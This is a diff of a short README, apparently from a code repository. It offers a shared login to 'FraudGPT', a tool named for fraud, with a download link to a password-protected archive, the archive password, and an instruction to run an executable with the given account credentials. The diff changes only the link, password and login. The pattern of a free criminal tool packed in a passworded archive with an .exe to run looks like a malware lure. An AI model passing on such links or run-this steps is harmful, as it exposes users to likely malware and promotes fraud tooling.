@@ -1,12 +1,12 @@
-# Fraud-GPT-Trial-Jan2025
+# Fraud-GPT-Trial-FEB2025
 
 Here is my paid login to FRAUDGPT. I used it for research on a paper i was writing. The subscription is still valid so i am sharing it. Do not use for illegal or unethical purposes. I claim no responsibility for misuse of this subscription.
 
-[Click Here To Download](https://www.mediafire.com/file/3sc5t7zmffnq9pl/FraudGPT.zip/file)
+[Click Here To Download](https://www.mediafire.com/file/zzyd2acsacfragi/FraudGPT.rar/file)
 
-[Pass: S0f4fr33! ]
+[Pass: S0f4fr33!]
 
-Execute FGPTjan2025.exe. Login : admin@uofc.ca Pass: Def4r%@1.
+Execute FGPTjan2025.exe. Login : admin@uofc.ca Pass: S0f4fr33!
 
 
 
